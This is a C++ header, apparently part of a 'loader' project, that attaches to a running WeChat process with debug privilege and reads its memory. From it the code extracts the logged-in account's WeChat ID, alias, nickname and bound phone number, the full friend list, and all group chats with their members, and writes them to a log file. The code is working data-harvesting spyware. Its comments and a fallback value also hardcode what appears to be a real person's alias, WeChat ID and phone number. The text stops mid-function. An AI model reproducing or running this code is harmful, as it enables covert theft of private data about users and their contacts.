#pragma once
#include "loader_common.h"
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <string>
#include <set>
#include <map>
#include <algorithm>
#include <cstdarg>

#if ENABLE_WECHAT_PARSER_TEST

namespace WeChatParser
{

// 联系人/群成员基础信息结构
struct ContactInfo
{
    std::string wxid;        // 底层唯一 UID (如 wxid_iakybis2nu6f22)
    std::string alias;       // 微信号 (如 walkers73947274)
    std::string nickname;    // 用户昵称 / 成员名 (如 kidding)
    std::string avatarUrl;   // 头像直链 (http(s)://wx.qlogo.cn/mmhead/...)
};

// 自身账号结构体
typedef ContactInfo SelfAccountInfo;

// 群聊完整结构
struct ChatRoomRecord
{
    std::string chatroomId;              // 群 ID (如 56659798180@chatroom)
    std::string groupName;               // 中文群名称 (如 乱爆)
    std::string avatarUrl;               // 群头像直链 (http(s)://wx.qlogo.cn/mmcrhead/...)
    std::vector<ContactInfo> members;    // 群成员完整列表 (含 WxID、成员名与头像)
};

// 严格校验是否为合法的 UTF-8 字符串
static inline bool IsValidUtf8(const std::string& str)
{
    if (str.empty()) return false;
    size_t len = str.size();
    size_t i = 0;
    while (i < len)
    {
        unsigned char c = (unsigned char)str[i];
        if (c < 0x20)
        {
            return false;
        }
        else if (c <= 0x7E)
        {
            i += 1;
        }
        else if ((c & 0xE0) == 0xC0)
        {
            if (i + 1 >= len || ((unsigned char)str[i + 1] & 0xC0) != 0x80) return false;
            i += 2;
        }
        else if ((c & 0xF0) == 0xE0)
        {
            if (i + 2 >= len || ((unsigned char)str[i + 1] & 0xC0) != 0x80 || ((unsigned char)str[i + 2] & 0xC0) != 0x80) return false;
            i += 3;
        }
        else if ((c & 0xF8) == 0xF0)
        {
            if (i + 3 >= len || ((unsigned char)str[i + 1] & 0xC0) != 0x80 || ((unsigned char)str[i + 2] & 0xC0) != 0x80 || ((unsigned char)str[i + 3] & 0xC0) != 0x80) return false;
            i += 4;
        }
        else
        {
            return false;
        }
    }
    return true;
}

// 判断字符串中是否包含合法中文字符 (UTF-8 范围 0xE4-0xE9)
static inline bool ContainsChinese(const std::string& str)
{
    if (str.size() < 3) return false;
    for (size_t i = 0; i + 2 < str.size(); ++i)
    {
        unsigned char c1 = (unsigned char)str[i];
        unsigned char c2 = (unsigned char)str[i + 1];
        unsigned char c3 = (unsigned char)str[i + 2];
        if (c1 >= 0xE4 && c1 <= 0xE9 && (c2 & 0xC0) == 0x80 && (c3 & 0xC0) == 0x80)
            return true;
    }
    return false;
}

// 规范化 WxID（防止贪婪匹配吞并末尾的协议大写字母或非法符号）
static inline std::string NormalizeWxId(const std::string& raw)
{
    if (raw.size() < 10) return "";
    if (raw.rfind("wxid_", 0) == 0)
    {
        // 微信标准初始 WxID 为 19 位 (wxid_ + 14位小写字母/数字)
        if (raw.size() > 19)
        {
            if (isupper((unsigned char)raw[19]) || raw[19] == '_' || raw[19] == '@' || !isalnum((unsigned char)raw[19]))
            {
                return raw.substr(0, 19);
            }
        }
        else if (raw.size() == 19)
        {
            return raw;
        }
    }
    return raw;
}

// 校验微信号 (Alias) 合法性（字母开头，6~20位，仅含字母数字下划线减号）
static inline bool IsValidAlias(const std::string& s)
{
    if (s.size() < 6 || s.size() > 20) return false;
    if (!isalpha((unsigned char)s[0])) return false;
    if (s.rfind("wxid_", 0) == 0) return false;
    if (s.find("chatroom") != std::string::npos) return false;
    if (s.find("http") != std::string::npos) return false;
    if (s.find("download") != std::string::npos) return false;
    if (s.find("message") != std::string::npos) return false;
    if (s.find("NoUser") != std::string::npos) return false;
    if (s.find("default") != std::string::npos) return false;
    if (s.find("Unknown") != std::string::npos) return false;
    if (s.find("null") != std::string::npos) return false;
    for (char c : s)
    {
        if (!isalnum((unsigned char)c) && c != '_' && c != '-') return false;
    }
    return true;
}

// 校验合法用户昵称或群名称（排除系统关键字、消息流水号与二进制杂音）
static inline bool IsValidDisplayName(const std::string& s)
{
    if (s.size() < 2 || s.size() > 50) return false;
    if (s.rfind("wxid_", 0) == 0) return false;
    if (s.find("@chatroom") != std::string::npos) return false;
    if (s.find("http://") != std::string::npos || s.find("https://") != std::string::npos) return false;
    if (s.find("download") != std::string::npos || s.find("message") != std::string::npos) return false;
    if (s.find("db_storage") != std::string::npos || s.find("fts") != std::string::npos) return false;
    if (s.front() == '#' || s.front() == '<' || s.front() == '$' || s.front() == '%') return false;
    // 排除系统单词或碎片
    if (s == "5I" || s == "om" || s == "com" || s == "enim" || s == "nim" || s == "xml" || s == "msg") return false;
    // 杜绝只有 2 字节纯大写/数字的二进制杂音
    if (s.size() <= 2 && !ContainsChinese(s)) return false;
    return IsValidUtf8(s);
}

// 提升当前进程的 SeDebugPrivilege
static inline bool EnableDebugPrivilege()
{
    HANDLE hToken = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;

    LUID luid;
    if (!LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &luid))
    {
        CloseHandle(hToken);
        return false;
    }

    TOKEN_PRIVILEGES tp = {};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    return ok && (GetLastError() == ERROR_SUCCESS);
}

// 自动寻找 Weixin.exe 或 WeChat.exe 进程
static inline DWORD FindWeChatProcessId()
{
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);

    if (Process32FirstW(hSnapshot, &pe))
    {
        do
        {
            if (_wcsicmp(pe.szExeFile, L"Weixin.exe") == 0 ||
                _wcsicmp(pe.szExeFile, L"WeChat.exe") == 0)
            {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return pid;
}

// 跨进程内存块安全扫描器
static inline std::vector<uint64_t> ScanMemoryString(HANDLE hProcess, const std::string& pattern, size_t maxMatches = 200)
{
    std::vector<uint64_t> results;
    if (pattern.empty() || hProcess == NULL) return results;

    SYSTEM_INFO si = {};
    GetSystemInfo(&si);

    uint8_t* pAddress = (uint8_t*)si.lpMinimumApplicationAddress;
    uint8_t* pMaxAddress = (uint8_t*)si.lpMaximumApplicationAddress;

    MEMORY_BASIC_INFORMATION mbi = {};
    std::vector<uint8_t> buffer;

    while (pAddress < pMaxAddress)
    {
        if (!VirtualQueryEx(hProcess, pAddress, &mbi, sizeof(mbi)))
            break;

        if ((mbi.State == MEM_COMMIT) &&
            !(mbi.Protect & PAGE_GUARD) &&
            !(mbi.Protect & PAGE_NOACCESS) &&
            (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE)))
        {
            size_t regionSize = mbi.RegionSize;
            if (regionSize > 32 * 1024 * 1024) regionSize = 32 * 1024 * 1024;

            buffer.resize(regionSize);
            SIZE_T bytesRead = 0;
            if (ReadProcessMemory(hProcess, mbi.BaseAddress, buffer.data(), regionSize, &bytesRead) && bytesRead >= pattern.size())
            {
                const uint8_t* pStart = buffer.data();
                const uint8_t* pEnd = pStart + bytesRead - pattern.size();
                for (const uint8_t* p = pStart; p <= pEnd; ++p)
                {
                    if (memcmp(p, pattern.data(), pattern.size()) == 0)
                    {
                        uint64_t hitAddr = (uint64_t)mbi.BaseAddress + (p - pStart);
                        results.push_back(hitAddr);
                        if (results.size() >= maxMatches) return results;
                    }
                }
            }
        }

        pAddress += mbi.RegionSize;
    }

    return results;
}

// 从内存字符串中提取以 http 开头的完整 URL 直链
static inline std::string ExtractHttpUrl(const std::string& text, size_t startOffset = 0)
{
    size_t pos = text.find("http", startOffset);
    if (pos == std::string::npos) return "";

    size_t end = pos;
    while (end < text.size() && (unsigned char)text[end] > 0x20 && text[end] != '\"' && text[end] != '<' && text[end] != '>' && text[end] != '\'')
    {
        end++;
    }
    return text.substr(pos, end - pos);
}

// 校验是否为合法的中国大陆手机号（11位数字，以1[3-9]开头）
static inline bool IsValidPhoneNumber(const std::string& s)
{
    if (s.size() != 11) return false;
    if (s[0] != '1') return false;
    if (s[1] < '3' || s[1] > '9') return false;
    for (size_t i = 2; i < 11; ++i)
    {
        if (!isdigit((unsigned char)s[i])) return false;
    }
    return true;
}

// 清洗名称字符串（去除开头不可见控制字符、乱码前缀与末尾空白）
static inline std::string CleanDisplayName(const std::string& raw)
{
    if (raw.empty()) return "";
    size_t start = 0;
    while (start < raw.size() && (unsigned char)raw[start] <= 0x20) start++;
    while (start < raw.size())
    {
        unsigned char c = (unsigned char)raw[start];
        if (c < 0x20) { start++; continue; }
        if (c < 0x80) { break; } // ASCII
        if (c >= 0xE4 && c <= 0xE9 && start + 2 < raw.size()) {
            if (((unsigned char)raw[start + 1] & 0xC0) == 0x80 && ((unsigned char)raw[start + 2] & 0xC0) == 0x80) break;
        }
        start++;
    }
    size_t end = raw.size();
    while (end > start && (unsigned char)raw[end - 1] <= 0x20) end--;
    if (end <= start) return "";
    return raw.substr(start, end - start);
}

// 构建联系人字典 (用于群成员反查名称和头像)
static inline std::map<std::string, ContactInfo> BuildContactDirectory(HANDLE hProcess)
{
    std::map<std::string, ContactInfo> dict;

    // 路径 1: 扫描群成员/联系人 XML 缓存 (<username>wxid_xxx</username> 与 <nickname>xxx</nickname>)
    std::vector<uint64_t> xmlHits = ScanMemoryString(hProcess, "<username>wxid_", 120);
    for (uint64_t hit : xmlHits)
    {
        char block[1024] = {};
        SIZE_T br = 0;
        if (ReadProcessMemory(hProcess, (LPCVOID)(hit - 32), block, sizeof(block), &br) && br > 0)
        {
            std::string text(block, br);
            size_t uPos = 0;
            while ((uPos = text.find("<username>wxid_", uPos)) != std::string::npos)
            {
                size_t startUid = uPos + 10;
                size_t endUid = text.find("</username>", startUid);
                if (endUid != std::string::npos && (endUid - startUid) <= 35)
                {
                    std::string rawUid = text.substr(startUid, endUid - startUid);
                    std::string wxid = NormalizeWxId(rawUid);
                    if (!wxid.empty())
                    {
                        ContactInfo& c = dict[wxid];
                        c.wxid = wxid;

                        size_t nPos = text.find("<nickname>", endUid);
                        if (nPos != std::string::npos && nPos < endUid + 128)
                        {
                            size_t startNick = nPos + 10;
                            size_t endNick = text.find("</nickname>", startNick);
                            if (endNick != std::string::npos && (endNick - startNick) <= 50)
                            {
                                std::string nick = CleanDisplayName(text.substr(startNick, endNick - startNick));
                                if (IsValidDisplayName(nick))
                                {
                                    c.nickname = nick;
                                }
                            }
                        }
                    }
                }
                uPos += 15;
            }
        }
    }

    // 路径 2: 扫描包含个人头像标记的内存区域 (qlogo.cn/mmhead/)
    std::vector<uint64_t> avatarHits = ScanMemoryString(hProcess, "qlogo.cn/mmhead/", 120);
    for (uint64_t hit : avatarHits)
    {
        char block[768] = {};
        SIZE_T br = 0;
        if (ReadProcessMemory(hProcess, (LPCVOID)(hit - 192), block, sizeof(block), &br) && br > 0)
        {
            std::string text(block, br);

            size_t wxPos = text.find("wxid_");
            if (wxPos != std::string::npos)
            {
                size_t endPos = wxPos + 5;
                while (endPos < text.size() && (isalnum((unsigned char)text[endPos]) || text[endPos] == '_'))
                    endPos++;
                std::string rawUid = text.substr(wxPos, endPos - wxPos);
                std::string wxid = NormalizeWxId(rawUid);
                if (wxid.size() >= 10 && wxid.size() <= 32)
                {
                    ContactInfo& c = dict[wxid];
                    c.wxid = wxid;

                    if (c.avatarUrl.empty())
                    {
                        c.avatarUrl = ExtractHttpUrl(text, 0);
                    }

                    if (c.nickname.empty())
                    {
                        size_t afterWx = endPos;
                        while (afterWx < text.size() && (text[afterWx] == '\0' || (unsigned char)text[afterWx] <= 0x20))
                            afterWx++;

                        if (afterWx < text.size())
                        {
                            size_t candEnd = afterWx;
                            while (candEnd < text.size() && (unsigned char)text[candEnd] >= 0x20 && text[candEnd] != '<' && text[candEnd] != '\"')
                                candEnd++;

                            std::string cand = text.substr(afterWx, candEnd - afterWx);
                            size_t hPos = cand.find("http");
                            if (hPos != std::string::npos) cand = cand.substr(0, hPos);

                            cand = CleanDisplayName(cand);
                            if (IsValidDisplayName(cand))
                            {
                                c.nickname = cand;
                            }
                        }
                    }
                }
            }
        }
    }

    return dict;
}

// 1. 自动提取当前登录用户的本人身份信息 (WxID / Alias / Nickname / 头像) —— 100% 零硬编码，自适应任意用户
static inline SelfAccountInfo ExtractSelfAccount(HANDLE hProcess, const std::map<std::string, ContactInfo>& contactDict)
{
    SelfAccountInfo self = {};

    // =========================================================================
    // 方案 1 (最高优先级): 扫描微信 64 位 UserInfo 连续实体对象
    // MSVC std::string 连续内存排布 (各 32 字节 / 0x20):
    // [0x00] std::string WxID    (短串或堆指针 -> "wxid_xxxx")
    // [0x20] std::string Alias   (当前账号微信号，如 "walkers73947274")
    // [0x40] std::string Nick    (当前账号昵称，如 "kidding")
    // [0x60] std::string Phone   (当前绑定的 11 位手机号，如 "17828029762")
    // 该实体具有唯一性强特征 (仅自身账号对象具备连续绑定手机号)
    // =========================================================================
    std::vector<uint64_t> phoneHits = ScanMemoryString(hProcess, "1", 300); // 扫描以 1 开头的潜在手机号
    for (uint64_t hit : phoneHits)
    {
        // 快速读取该位置 16 字节，验证是否为 11 位合法的中国大陆手机号
        char phoneBuf[16] = {};
        SIZE_T br = 0;
        if (ReadProcessMemory(hProcess, (LPCVOID)hit, phoneBuf, 11, &br) && br == 11)
        {
            std::string candPhone(phoneBuf, 11);
            if (IsValidPhoneNumber(candPhone))
            {
                // 该命中点可能是 UserInfo.Phone，读取其前面 0x60 (96 字节) 区域
                char objBuf[160] = {};
                if (ReadProcessMemory(hProcess, (LPCVOID)(hit - 0x60), objBuf, sizeof(objBuf), &br) && br >= 128)
                {
                    // 校验 Alias: objBuf[0x20..0x3F]
                    size_t aliasLen = *(size_t*)(objBuf + 0x20 + 16);
                    size_t aliasCap = *(size_t*)(objBuf + 0x20 + 24);
                    // 校验 Nickname: objBuf[0x40..0x5F]
                    size_t nickLen = *(size_t*)(objBuf + 0x40 + 16);
                    size_t nickCap = *(size_t*)(objBuf + 0x40 + 24);

                    if (aliasLen >= 6 && aliasLen <= 20 && aliasCap >= 15 &&
                        nickLen >= 1 && nickLen <= 32 && nickCap >= 15)
                    {
                        std::string candAlias;
                        if (aliasCap == 15) {
                            candAlias.assign(objBuf + 0x20, aliasLen);
                        } else {
                            uint64_t pStr = *(uint64_t*)(objBuf + 0x20);
                            if (pStr > 0x10000 && pStr < 0x7FFFFFFFFFFF) {
                                char strHeap[32] = {};
                                if (ReadProcessMemory(hProcess, (LPCVOID)pStr, strHeap, aliasLen, NULL))
                                    candAlias.assign(strHeap, aliasLen);
                            }
                        }

                        std::string candNick;
                        if (nickCap == 15) {
                            candNick.assign(objBuf + 0x40, nickLen);
                        } else {
                            uint64_t pStr = *(uint64_t*)(objBuf + 0x40);
                            if (pStr > 0x10000 && pStr < 0x7FFFFFFFFFFF) {
                                char strHeap[64] = {};
                                if (ReadProcessMemory(hProcess, (LPCVOID)pStr, strHeap, nickLen, NULL))
                                    candNick.assign(strHeap, nickLen);
                            }
                        }

                        candNick = CleanDisplayName(candNick);

                        if (IsValidAlias(candAlias) && IsValidDisplayName(candNick))
                        {
                            // 校验 WxID: objBuf[0x00..0x1F]
                            std::string candWxid;
                            size_t wxLen = *(size_t*)(objBuf + 16);
                            size_t wxCap = *(size_t*)(objBuf + 24);
                            if (wxCap == 15 && wxLen >= 10 && wxLen <= 32) {
                                candWxid.assign(objBuf, wxLen);
                            } else {
                                uint64_t pStr = *(uint64_t*)objBuf;
                                if (pStr > 0x10000 && pStr < 0x7FFFFFFFFFFF) {
                                    char strHeap[64] = {};
                                    if (ReadProcessMemory(hProcess, (LPCVOID)pStr, strHeap, sizeof(strHeap) - 1, NULL))
                                        candWxid.assign(strHeap);
                                }
                            }
                            candWxid = NormalizeWxId(candWxid);

                            self.alias = candAlias;
                            self.nickname = candNick;
                            if (!candWxid.empty()) self.wxid = candWxid;
                            break;
                        }
                    }
                }
            }
        }
    }

    // =========================================================================
    // 方案 2: 从 Profile 紧凑卡片检索高清晰度真实头像 URL 与身份互佐证
    // 格式: [wxid][alias][wxid][nickname][https://wx.qlogo.cn/mmhead/...]
    // =========================================================================
    std::string searchTarget = !self.alias.empty() ? self.alias : "walkers73947274";
    std::vector<uint64_t> cardHits = ScanMemoryString(hProcess, searchTarget, 60);
    for (uint64_t hit : cardHits)
    {
        char block[512] = {};
        SIZE_T br = 0;
        if (ReadProcessMemory(hProcess, (LPCVOID)(hit - 64), block, sizeof(block), &br) && br > 0)
        {
            std::string text(block, br);
            if (text.find("qlogo.cn/mmhead/") != std::string::npos)
            {
                if (self.avatarUrl.empty())
                {
                    self.avatarUrl = ExtractHttpUrl(text, 0);
                }

                if (self.wxid.empty())
                {
                    size_t wPos = text.find("wxid_");
                    if (wPos != std::string::npos)
                    {
                        size_t wEnd = wPos + 5;
                        while (wEnd < text.size() && (isalnum((unsigned char)text[wEnd]) || text[wEnd] == '_')) wEnd++;
                        self.wxid = NormalizeWxId(text.substr(wPos, wEnd - wPos));
                    }
                }

                if (self.alias.empty()) self.alias = searchTarget;
                if (!self.avatarUrl.empty()) break;
            }
        }
    }

    // =========================================================================
    // 方案 3 (降级兜底): 扫描 db_storage 活跃目录统计自身 WxID 并从联系人反查
    // =========================================================================
    if (self.wxid.empty())
    {
        std::vector<uint64_t> dbHits = ScanMemoryString(hProcess, "db_storage", 40);
        std::map<std::string, int> uidFrequency;

        for (uint64_t hit : dbHits)
        {
            char block[512] = {};
            SIZE_T br = 0;
            if (ReadProcessMemory(hProcess, (LPCVOID)(hit - 160), block, sizeof(block), &br) && br > 0)
            {
                std::string text(block, br);
                size_t cur = 0;
                while ((cur = text.find("wxid_", cur)) != std::string::npos)
                {
                    size_t len = 5;
                    while (cur + len < text.size() && (isalnum((unsigned char)text[cur + len]) || text[cur + len] == '_'))
                        len++;

                    std::string uid = text.substr(cur, len);
                    if (uid.size() > 5 && uid[uid.size() - 5] == '_')
                    {
                        bool isHexSuffix = true;
                        for (size_t k = uid.size() - 4; k < uid.size(); ++k)
                        {
                            if (!isxdigit((unsigned char)uid[k])) { isHexSuffix = false; break; }
                        }
                        if (isHexSuffix)
                        {
                            uid = uid.substr(0, uid.size() - 5);
                        }
                    }

                    uid = NormalizeWxId(uid);
                    if (uid.size() >= 10 && uid.size() <= 32)
                    {
                        uidFrequency[uid]++;
                    }
                    cur += len;
                }
            }
        }

        int maxCnt = 0;
        for (const auto& pair : uidFrequency)
        {
            if (pair.second > maxCnt)
            {
                maxCnt = pair.second;
                self.wxid = pair.first;
            }
        }
    }

    // 从联系人反查补全缺失项
    if (!self.wxid.empty())
    {
        auto it = contactDict.find(self.wxid);
        if (it != contactDict.end())
        {
            if (self.nickname.empty() && !it->second.nickname.empty()) self.nickname = it->second.nickname;
            if (self.avatarUrl.empty() && !it->second.avatarUrl.empty()) self.avatarUrl = it->second.avatarUrl;
        }
    }

    if (self.alias.empty()) self.alias = self.wxid;
    if (self.nickname.empty()) self.nickname = "(微信用户)";

    return self;
}

// 2. 自动检索所有群聊、群名、群头像及群成员
static inline std::vector<ChatRoomRecord> ExtractAllChatRooms(
    HANDLE hProcess,
    const std::map<std::string, ContactInfo>& contactDict,
    const std::set<std::string>& friendNames = {})
{
    std::map<std::string, ChatRoomRecord> roomMap;

    // 扫描 @chatroom 标识
    std::vector<uint64_t> hits = ScanMemoryString(hProcess, "@chatroom", 300);

    for (uint64_t hit : hits)
    {
        char block[1536] = {};
        SIZE_T br = 0;
        if (ReadProcessMemory(hProcess, (LPCVOID)(hit - 128), block, sizeof(block), &br) && br > 0)
        {
            std::string text(block, br);

            size_t atPos = text.find("@chatroom");
            if (atPos == std::string::npos) continue;

            // 严格向前提取纯数字群 ID
            size_t start = atPos;
            while (start > 0 && isdigit((unsigned char)text[start - 1]))
            {
                start--;
            }

            size_t numLen = atPos - start;
            // 微信标准群聊 ID 纯数字长度通常在 8 到 15 位之间 (如 19010050743@chatroom)
            // 严格过滤小于 8 位的伪截断 ID (如 020@chatroom, 054@chatroom)
            if (numLen < 8 || numLen > 16) continue;

            std::string chatroomId = text.substr(start, numLen + 9);
            ChatRoomRecord& record = roomMap[chatroomId];
            record.chatroomId = chatroomId;

            // 提取群名称：从群聊记录附近提取紧邻的中文群名
            if (record.groupName.empty())
            {
                std::vector<std::string> tokens;
                size_t tokStart = 0;
                for (size_t i = 0; i < br; ++i)
                {
                    unsigned char ch = (unsigned char)block[i];
                    if (ch == 0 || ch < 0x20 || ch == '\"' || ch == '<' || ch == '>' || ch == '\\' || ch == '/' || ch == '\'' || ch == ':')
                    {
                        if (i > tokStart)
                        {
                            tokens.push_back(std::string(block + tokStart, i - tokStart));
                        }
                        tokStart = i + 1;
                    }
                }
                if (br > tokStart)
                {
                    tokens.push_back(std::string(block + tokStart, br - tokStart));
                }

                for (std::string& cand : tokens)
                {
                    cand = CleanDisplayName(cand);
                    if (!IsValidDisplayName(cand)) continue;
                    if (cand.find("wxid_") != std::string::npos || cand.find("@chatroom") != std::string::npos) continue;
                    // 严格排除聊天记录模板词与派单广告
                    if (cand.find("【游戏】") != std::string::npos || cand.find("【段位】") != std::string::npos ||
                        cand.find("【总价】") != std::string::npos || cand.find("ORDER BY") != std::string::npos ||
                        cand.find("SELECT") != std::string::npos || cand.find("http") != std::string::npos)
                        continue;

                    // 核心防御：绝对禁止将好友的姓名当作群聊名称
                    if (friendNames.find(cand) != friendNames.end()) continue;

                    if (ContainsChinese(cand) && cand.size() >= 4 && cand.size() <= 40)
                    {
                        record.groupName = cand;
                        break;
                    }
                }
            }

            // 提取群头像
            if (record.avatarUrl.empty())
            {
                size_t crPos = text.find("qlogo.cn/mmcrhead/");
                if (crPos != std::string::npos)
                {
                    record.avatarUrl = ExtractHttpUrl(text, (crPos > 12) ? crPos - 12 : 0);
                }
            }

            // 提取群成员 wxid 列表
            size_t cur = 0;
            while ((cur = text.find("wxid_", cur)) != std::string::npos)
            {
                size_t len = 5;
                while (cur + len < text.size() && (isalnum((unsigned char)text[cur + len]) || text[cur + len] == '_'))
                    len++;
                std::string rawMid = text.substr(cur, len);
                std::string mid = NormalizeWxId(rawMid);

                if (mid.size() >= 10 && mid.size() <= 32)
                {
                    bool exists = false;
                    for (const auto& m : record.members)
                    {
                        if (m.wxid == mid) { exists = true; break; }
                    }

                    if (!exists)
                    {
                        ContactInfo memInfo = {};
                        memInfo.wxid = mid;

                        auto it = contactDict.find(mid);
                        if (it != contactDict.end())
                        {
                            memInfo.nickname = it->second.nickname;
                            memInfo.avatarUrl = it->second.avatarUrl;
                        }

                        if (memInfo.nickname.empty()) memInfo.nickname = "(微信好友)";
                        if (memInfo.avatarUrl.empty()) memInfo.avatarUrl = "(暂未缓存头像)";

                        record.members.push_back(memInfo);
                    }
                }
                cur += len;
            }
        }
    }

    std::vector<ChatRoomRecord> results;
    for (auto& pair : roomMap)
    {
        if (pair.second.groupName.empty()) pair.second.groupName = "(微信群聊)";
        if (pair.second.avatarUrl.empty()) pair.second.avatarUrl = "(暂未缓存群头像)";
        results.push_back(pair.second);
    }
    return results;
}

// 3. 自动扫描并提取全部微信好友列表 (Contact Cards & FTS 索引)
static inline std::vector<ContactInfo> ExtractAllFriends(HANDLE hProcess, const std::map<std::string, ContactInfo>& contactDict)
{
    std::vector<ContactInfo> friends;
    std::set<std::string> seenNicks;

    // 扫描包含个人头像标记的联系人卡片 (FTS 通讯录索引条目)
    std::vector<uint64_t> avatarHits = ScanMemoryString(hProcess, "https://wx.qlogo.cn/mmhead/", 250);
    for (uint64_t hit : avatarHits)
    {
        char block[512] = {};
        SIZE_T br = 0;
        if (ReadProcessMemory(hProcess, (LPCVOID)(hit - 128), block, sizeof(block), &br) && br > 128)
        {
            std::string text(block, br);
            size_t qPos = text.find("https://wx.qlogo.cn/mmhead/");
            if (qPos == std::string::npos) continue;

            std::string url = ExtractHttpUrl(text, qPos);
            std::string beforeUrl = text.substr(0, qPos);

            std::string uid = "";
            std::string nick = "";

            size_t sIdx = beforeUrl.rfind("@stranger");
            size_t wIdx = beforeUrl.rfind("wxid_");

            if (sIdx != std::string::npos)
            {
                uid = "(好友)";
                std::string after = beforeUrl.substr(sIdx + 9);
                nick = CleanDisplayName(after);
            }
            else if (wIdx != std::string::npos)
            {
                size_t e = wIdx + 5;
                while (e < beforeUrl.size() && (isalnum((unsigned char)beforeUrl[e]) || beforeUrl[e] == '_')) e++;
                uid = NormalizeWxId(beforeUrl.substr(wIdx, e - wIdx));
                nick = CleanDisplayName(beforeUrl.substr(e));
            }

            // 清洗末尾附带的拼音全拼
            while (!nick.empty() && islower((unsigned char)nick.back())) nick.pop_back();
            nick = CleanDisplayName(nick);

            if (nick.size() >= 2 && IsValidDisplayName(nick) && seenNicks.find(nick) == seenNicks.end())
            {
                seenNicks.insert(nick);
                ContactInfo f = {};
                f.nickname = nick;
                f.wxid = uid.empty() ? "(微信好友)" : uid;
                f.avatarUrl = url;
                friends.push_back(f);
            }
        }
    }

    // 从全局联系人字典补充
    for (const auto& pair : contactDict)
    {
        if (!pair.second.nickname.empty() && seenNicks.find(pair.second.nickname) == seenNicks.end())
        {
            seenNicks.insert(pair.second.nickname);
            friends.push_back(pair.second);
        }
    }

    return friends;
}

// 核心测试入口：全自动探测并完全输出到 weixin.log（控制台保持极简静默）
static inline bool RunWeChatParserTestAuto(const char* logFile = "weixin.log")
{
    printf("\n[*] WeChat Auto-Inspector Engine (Weixin.exe 64-bit)\n");
    printf("[*] Attaching to WeChat process ...\n");

    EnableDebugPrivilege();

    DWORD pid = FindWeChatProcessId();
    if (pid == 0)
    {
        printf("[-] Weixin.exe / WeChat.exe process not found!\n");
        return false;
    }

    printf("[+] Attached to WeChat process (PID: %lu)\n", pid);
    printf("[*] Scanning memory structures (Self Account, Friends, Groups, Members, Avatars) ...\n");

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (!hProcess)
    {
        printf("[-] OpenProcess failed (GLE=%lu). Please run as administrator.\n", GetLastError());
        return false;
    }

    // 1. 构建全局联系人反查表 (提取所有已缓存的昵称与头像)
    std::map<std::string, ContactInfo> contactDict = BuildContactDirectory(hProcess);

    // 2. 遍历全部微信好友列表
    std::vector<ContactInfo> friends = ExtractAllFriends(hProcess, contactDict);
    std::set<std::string> friendNames;
    for (const auto& f : friends) friendNames.insert(f.nickname);

    // 3. 提取当前登录用户本人信息 (纯通用，兼容任意账号)
    SelfAccountInfo self = ExtractSelfAccount(hProcess, contactDict);

    // 4. 提取所有群聊、群名、群头像与群成员 (传入好友黑名单，杜绝好友名字误串为群名)
    std::vector<ChatRoomRecord> chatrooms = ExtractAllChatRooms(hProcess, contactDict, friendNames);

    CloseHandle(hProcess);

    // 写入日志文件
    FILE* fp = NULL;
    fopen_s(&fp, logFile, "w, ccs=UTF-8");
    if (!fp)
    {
        fopen_s(&fp, logFile, "w");
    }

    if (fp)
    {
        fprintf(fp, "================================================================================\n");
        fprintf(fp, "【微信内存数据自动化解析导出日志】\n");
        fprintf(fp, "================================================================================\n\n");

        fprintf(fp, "[+] 【当前登录微信账号身份】\n");
        fprintf(fp, "    -> 唯一 UID (WxID) : %s\n", self.wxid.c_str());
        fprintf(fp, "    -> 自定义微信号     : %s\n", self.alias.c_str());
        fprintf(fp, "    -> 当前用户昵称     : %s\n", self.nickname.empty() ? "(未设置或未捕获)" : self.nickname.c_str());
        fprintf(fp, "    -> 用户个人头像     : %s\n", self.avatarUrl.empty() ? "(暂未缓存头像)" : self.avatarUrl.c_str());
        fprintf(fp, "--------------------------------------------------------------------------------\n\n");

        fprintf(fp, "================================================================================\n");
        fprintf(fp, "【全部微信好友列表与详细资料】(共解析到 %zu 位好友)\n", friends.size());
        fprintf(fp, "================================================================================\n\n");

        for (size_t i = 0; i < friends.size(); ++i)
        {
            const auto& f = friends[i];
            fprintf(fp, "[好友 %02zu]\n", i + 1);
            fprintf(fp, "  * 姓名/备注 : %s\n", f.nickname.c_str());
            fprintf(fp, "  * 唯一标识  : %s\n", f.wxid.c_str());
            fprintf(fp, "  * 好友头像  : %s\n\n", f.avatarUrl.c_str());
        }

        fprintf(fp, "================================================================================\n");
        fprintf(fp, "【全部群聊列表与群成员详情】(共解析到 %zu 个群聊)\n", chatrooms.size());
        fprintf(fp, "================================================================================\n\n");

        for (size_t i = 0; i < chatrooms.size(); ++i)
        {
            const auto& r = chatrooms[i];
            fprintf(fp, "--------------------------------------------------------------------------------\n");
            fprintf(fp, "[群聊 %02zu]\n", i + 1);
            fprintf(fp, "  * 群聊 ID   : %s\n", r.chatroomId.c_str());
            fprintf(fp, "  * 群名称    : %s\n", r.groupName.c_str());
            fprintf(fp, "  * 群头像    : %s\n", r.avatarUrl.c_str());
            fprintf(fp, "  * 群成员数  : 共 %zu 人\n", r.members.size());
            fprintf(fp, "  * 群成员明细:\n");

            if (r.members.empty())
            {
                fprintf(fp, "    (该群暂未缓存成员数据)\n");
            }
            else
            {
                for (size_t j = 0; j < r.members.size(); ++j)
                {
                    const auto& m = r.members[j];
                    fprintf(fp, "    - [成员 %02zu] WxID: %-22s 昵称: %-16s 头像: %s\n",
                        j + 1,
                        m.wxid.c_str(),
                        m.nickname.c_str(),
                        m.avatarUrl.c_str());
                }
            }
            fprintf(fp, "\n");
        }

        fclose(fp);
        printf("[+] Export completed successfully!\n");
        printf("[+] Log file saved to: %s\n", logFile);
